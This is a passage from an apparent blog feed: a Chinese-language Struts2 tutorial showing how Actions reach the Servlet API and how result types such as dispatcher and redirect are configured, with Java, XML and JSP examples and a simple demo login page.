class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.LoginAction&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;error&quot;</span>&gt;</span>/error.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p>login.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;<br>    pageEncoding=&quot;UTF-8&quot;%&gt;<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>登陆页面<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;center&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>账号:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br>密码:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;登陆&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>success.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;<br>    pageEncoding=&quot;UTF-8&quot;%&gt;<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="hljs-meta-string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>登陆成功页面<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">algin</span>=<span class="hljs-string">center</span>&gt;</span>通过ActionContext类访问Servelt API<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>$&#123;success &#125;<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>用户登录信息<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>用户名:$&#123;username &#125;<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>密    码:$&#123;password &#125;<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>error.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;<br>    pageEncoding=&quot;UTF-8&quot;%&gt;<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="hljs-meta-string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>登陆失败页面<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>$&#123;error &#125;<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>发布项目访问login.jsp<br><img src="https://img-blog.csdnimg.cn/20210326201914583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入错误的账号密码，提示登陆失败<br><img src="https://img-blog.csdnimg.cn/20210326201922847.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入正确的用户名admin和密码123456，提示登陆成功<br><img src="https://img-blog.csdnimg.cn/20210326201939672.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>从返回用户信息，可以看出来，在Action中放入ActionContext的key-value键值对被提取出来了，说明struts2可以通过ActionContext类访问Servlet API。</p><h3 id="通过特定接口访问"><a href="#通过特定接口访问" class="headerlink" title="通过特定接口访问"></a>通过特定接口访问</h3><p>Struts2框架提供了ActionContext来访问Servlet API，但无法直接获得Servlet API实例，Struts2提供如下几个接口使Action可以直接访问到Servlet API：</p><table><thead><tr><th>接口</th><th>功能描述</th></tr></thead><tbody><tr><td>ServletContextAware</td><td>实现该接口的Action可以直接访问Web应用的ServletContext实例</td></tr><tr><td>ServletRequestAware</td><td>实现该接口的Action可以直接访问Web应用的ServletRequest实例</td></tr><tr><td>ServletResponseAware:</td><td>实现该接口的Action可以直接访问Web应用的ServletRsponse实例</td></tr></tbody></table><p>实例2：</p><p>AwareAction.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><br><span class="hljs-keyword">import</span> org.apache.struts2.interceptor.ServletRequestAware;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionContext;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AwareAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ActionSupport</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ServletRequestAware</span></span>&#123;<br>HttpServletRequest request;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setServletRequest</span><span class="hljs-params">(HttpServletRequest request)</span> </span>&#123;<br><span class="hljs-keyword">this</span>.request=request;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>request.setAttribute(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;通过ServletRequestAware接口实现了访问Servlet API的访问&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>struts.xml配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;AwareDemo&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;aware&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.AwareAction&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span>/message.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p>message.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">algin</span>=<span class="hljs-string">&quot;center&quot;</span>&gt;</span>$&#123;requestScope.message&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p>发布项目，访问aware<br><img src="https://img-blog.csdnimg.cn/20210326204201290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看出，使用ServletRequestAware接口顺利访问Servlet API了的</p><h3 id="通过ServletActionContext访问"><a href="#通过ServletActionContext访问" class="headerlink" title="通过ServletActionContext访问"></a>通过ServletActionContext访问</h3><p>Struts2还提供了一个ServletActionContext工具类用来访问Servlet API。该类包含了一下几个静态方法：</p><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>static PageContext getPageContext()</td><td>取得Web应用的PageContext对象</td></tr><tr><td>static HttpServletRequest getRequest()</td><td>取得Web应用的?HttpServletRequest对象</td></tr><tr><td>static HttpServletResponse getResponse()</td><td>取得Web应用的HttpServletResponse对象</td></tr><tr><td>static ServletContext getServletContext()</td><td>取得Web应用的ServletContext对象</td></tr></tbody></table><p>实例3：<br>ContextAction.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><br><span class="hljs-keyword">import</span> org.apache.struts2.ServletActionContext;<br><span class="hljs-keyword">import</span> org.apache.struts2.interceptor.ServletRequestAware;<br><br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionContext;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ContextAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ActionSupport</span> </span>&#123;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>ServletActionContext.getRequest().setAttribute(<span class="hljs-string">&quot;message&quot;</span>, <br><span class="hljs-string">&quot;通过ServletActionContext类直接访问Servlet API&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br><br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>struts.xml配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ContextDemo&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;context&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.ContextAction&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span>/context.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p>context.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">algin</span>=<span class="hljs-string">center</span>&gt;</span>$&#123;requestScope.message&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p>发布项目，访问context<br><img src="https://img-blog.csdnimg.cn/20210326204934276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>借助ServletActionContext类的帮助，也可以在Action中直接访问Servlet API，避免了Action实现AxxAction等接口。</p><p>在开发中应优先使用ActionContext来避免和Servlet API耦合</p><h2 id="Aciton处理请求参数"><a href="#Aciton处理请求参数" class="headerlink" title="Aciton处理请求参数"></a>Aciton处理请求参数</h2><p>在Struts2中，页面的请求数据和Action有两种基本的对应方式，分别是字段驱动(FileldDriven)方式和模型驱动(ModelDriven)方式。其中，字段驱动也叫做为属性驱动。</p><h3 id="属性驱动"><a href="#属性驱动" class="headerlink" title="属性驱动"></a>属性驱动</h3><p>  1.基本数据类型字段驱动方式的数据传递:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.hjc.Action;<br><br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ActionOne</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ActionSupport</span> </span>&#123;<br><span class="hljs-keyword">private</span> String UserName;<br><span class="hljs-keyword">private</span> String PassWord;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getUserName</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> UserName;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUserName</span><span class="hljs-params">(String userName)</span> </span>&#123;<br>UserName = userName;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getPassWord</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> PassWord;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setPassWord</span><span class="hljs-params">(String passWord)</span> </span>&#123;<br>PassWord = passWord;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>  2.直接使用域对象字段驱动方式的数据传递</p><h3 id="模型驱动"><a href="#模型驱动" class="headerlink" title="模型驱动"></a>模型驱动</h3><p>模型驱动，通过实现ModelDriven接口来接受请求参数，Action类必须实现接口，并且要重写getModel()方法，这个方法返回的就是Action所使用的数据模型对象。</p><h2 id="Result结果类型"><a href="#Result结果类型" class="headerlink" title="Result结果类型"></a>Result结果类型</h2><h3 id="配置-Result"><a href="#配置-Result" class="headerlink" title="配置 Result"></a>配置 Result</h3><p>result标签的属性：</p><ul><li>name属性：指定逻辑视图的名称，默认为success。</li><li>type 属性：指定返回的视图资源的类型，不同的类型代表不同的结果输出，默认值是dispatcher。</li></ul><p>struts.xml文件中<code>&lt;result&gt;</code>元素配置代码如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;loginAction&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.LoginAction&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;redirect&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;loaction&quot;</span>&gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br></code></pre></td></tr></table></figure><p>上述配置，使用了<code>&lt;result&gt;</code>元素的name、type属性和param子元素。</p><p><code>&lt;param&gt;</code>子元素的name属性有两个值,分别如下:</p><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td>location</td><td>指定该逻辑视图所对应的实际视图资源。</td></tr><tr><td>parse</td><td>指定在逻辑视图资源名称中是否可以使用OGNL表达式。默认值为true,表示可以使用，如果设为false,则表示不支持。</td></tr></tbody></table><p>上面的配置可以简化为：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;loginAction&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.LoginAction&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">result</span>&gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="预定义的结果类型"><a href="#预定义的结果类型" class="headerlink" title="预定义的结果类型"></a>预定义的结果类型</h3><table><thead><tr><th>属性</th><th>说明</th><th>对应类</th></tr></thead><tbody><tr><td>chain</td><td>用来处理Action 链</td><td>com.opensymphony.xwork2.ActionChainResult</td></tr><tr><td>dispatcher</td><td>用来转向页面，通常处理 JSP</td><td>org.apache.struts2.dispatcher.ServletDispatcherResult</td></tr><tr><td>redirect</td><td>重定向到一个URL</td><td>org.apache.struts2.dispatcher.ServletRedirectResult</td></tr><tr><td>redirectAction</td><td>重定向到一个 Action</td><td>org.apache.struts2.dispatcher.ServletActionRedirectResult</td></tr><tr><td>plainText</td><td>显示源文件内容，如文件源码</td><td>org.apache.struts2.dispatcher.PlainTextResult</td></tr><tr><td>freemarker</td><td>处理 FreeMarker 模板</td><td>org.apache.struts2.views.freemarker.FreemarkerResult</td></tr><tr><td>httpheader</td><td>控制特殊 http 行为的结果类型</td><td>org.apache.struts2.dispatcher.HttpHeaderResult</td></tr><tr><td>stream</td><td>向浏览器发送 InputSream 对象，通常用来处理文件下载，还可用于返回 AJAX 数据。</td><td>org.apache.struts2.dispatcher.StreamResult</td></tr><tr><td>velocity</td><td>处理 Velocity 模板</td><td>org.apache.struts2.dispatcher.VelocityResult</td></tr><tr><td>xslt</td><td>处理 XML/XLST 模板</td><td>org.apache.struts2.views.xslt.XSLTResult</td></tr></tbody></table><p>表中例举了Struts2中预定义的全部11种结果类型，其中dispatcher是默认的结果类型，主要用来与JSP整合。其中，dispatcher和redirect是比较常用到的结果集。</p><h3 id="dispatcher结果类型"><a href="#dispatcher结果类型" class="headerlink" title="dispatcher结果类型"></a>dispatcher结果类型</h3><p>dispatcher结果类型用来表示“转发”到指定结果资源，它是struts2默认的结果类型。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>  <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;dispatcher&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;location&quot;</span> &gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;parse&quot;</span> &gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br></code></pre></td></tr></table></figure><p>上面的代码中，location参数用于指定Action执行完毕后要转向的目标资源；parse参数是一个布尔型的值，默认是true，表示解析location参数中的OGNL表达式。</p><h3 id="redirect结果类型"><a href="#redirect结果类型" class="headerlink" title="redirect结果类型"></a>redirect结果类型</h3><p>redirect结果类型用来重定向到新的结果资源，该资源可以是JSP文件，也可以是Action文件。</p><p>对本文上面<code>通过ActionContext类访问Servlet API</code>标题下面的struts.xml代码进行更改：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.LoginAction&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;redirect&quot;</span>&gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;error&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;dispatcher&quot;</span>&gt;</span>/error.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br></code></pre></td></tr></table></figure><p>用户名和密码正确，使用redirect重新定向到success.jsp；用户名和密码错误，使用的是dispatcher的结果类型，跳转到error.jsp。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：Struts2框架学习笔记（二）&lt;/p&gt;</summary>
    
    
    
    <category term="编程开发" scheme="http://atkx.top/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"/>
    
    <category term="JAVA" scheme="http://atkx.top/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/JAVA/"/>
    
    
    <category term="Struts2" scheme="http://atkx.top/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>CTFshow-Web入门-信息泄露</title>
    <link href="http://atkx.top/2021/03/26/CTFshow-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
